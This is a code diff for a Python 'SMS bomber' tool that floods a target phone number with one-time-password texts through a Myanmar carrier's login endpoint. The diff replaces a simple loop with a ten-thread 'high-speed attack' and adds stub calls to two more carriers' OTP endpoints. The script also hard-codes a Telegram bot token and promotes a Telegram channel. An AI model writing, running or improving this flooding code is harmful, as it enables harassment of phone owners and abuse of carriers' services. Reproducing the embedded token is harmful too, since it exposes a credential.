@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
-import requests, time, sys, hashlib, os, platform, subprocess, json, random
+import requests, time, sys, hashlib, os, platform, subprocess, json, random, threading
+from concurrent.futures import ThreadPoolExecutor
 
 # --- CONFIGURATION ---
 BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
 # Key storage file
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".shine_vip_key.json")
 # Your Telegram Channel Link
-CHANNEL_LINK = "https://t.me/shinekokoPUBGFreeFile" 
+CHANNEL_LINK = "https://t.me/A_ToolsX" 
 
 # Colors
 G = "\033[1;32m" # Green
@@ -239,17 +240,41 @@ def auth(d_id, model):
         beep()
         time.sleep(2)
 
-def send_otp(p, c):
-    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
-    print(f"\n{W}[*] Starting SMS Bomber for {C}{p}{W}...")
-    loading_bar(0, c)
-    for i in range(c):
-        try:
-            requests.get(url.format(p), timeout=5)
-        except: pass
-        loading_bar(i + 1, c)
-        time.sleep(0.05)
-    print(f"\n{G}[+] Process Finished Successfully!{X}")
+# --- SMS API FUNCTIONS ---
+def call_mytel(phone):
+    try:
+        requests.get(f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}", timeout=5)
+    except: pass
+
+def call_atom(phone):
+    try:
+        # Simplified Atom API Example (Needs real headers/data for full bypass)
+        requests.post("https://api.atom.com.mm/v1/otp/send", json={"msisdn": phone}, timeout=5)
+    except: pass
+
+def call_ooredoo(phone):
+    try:
+        # Simplified Ooredoo API Example
+        requests.get(f"https://www.ooredoo.com.mm/api/otp?phone={phone}", timeout=5)
+    except: pass
+
+def send_otp_thread(phone):
+    # Randomly pick an API or call all
+    call_mytel(phone)
+    # call_atom(phone)
+    # call_ooredoo(phone)
+
+def start_bombing(p, c):
+    print(f"\n{W}[*] Initializing VIP High-Speed Threads for {C}{p}{W}...")
+    
+    # Use ThreadPoolExecutor for high speed
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        for i in range(c):
+            executor.submit(send_otp_thread, p)
+            loading_bar(i + 1, c)
+            time.sleep(0.01) # Very small delay for speed
+            
+    print(f"\n{G}[+] High-Speed Attack Finished!{X}")
     input(f"\n{W}Press Enter to return to menu...{X}")
 
 def show_profile(d_id):
@@ -316,7 +341,7 @@ def main_menu(d_id, model):
                     continue
                 try:
                     c = int(input(f"{W}[?]{G} Enter Request Count: {W}"))
-                    send_otp(p, c)
+                    start_bombing(p, c)
                     transition_anim()
                 except ValueError:
                     print(f"{R}[!] Invalid count.{X}")
